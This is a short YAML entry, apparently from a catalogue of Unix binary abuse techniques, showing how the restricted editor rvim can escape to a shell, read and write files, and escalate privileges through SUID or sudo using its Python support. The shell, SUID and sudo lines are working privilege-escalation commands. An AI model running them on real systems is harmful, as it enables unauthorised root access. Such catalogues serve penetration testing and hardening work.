---
functions:
  shell:
    - description: This requires that rvim is compiled with Python support.
      code: rvim -c ':py import os;os.system("sh")'
  file-write:
    - description: This requires that rvim is compiled with Python support.
      code: |
        rvim file_to_write
        iDATA
        ^[
        w
  file-read:
    - code: rvim file_to_read
  suid:
    - description: This requires that rvim is compiled with Python support.
      code: ./rvim -c ':py import os;os.system("sh")'
  sudo:
    - description: This requires that rvim is compiled with Python support.
      code: sudo rvim -c ':py import os;os.system("sh")'
---
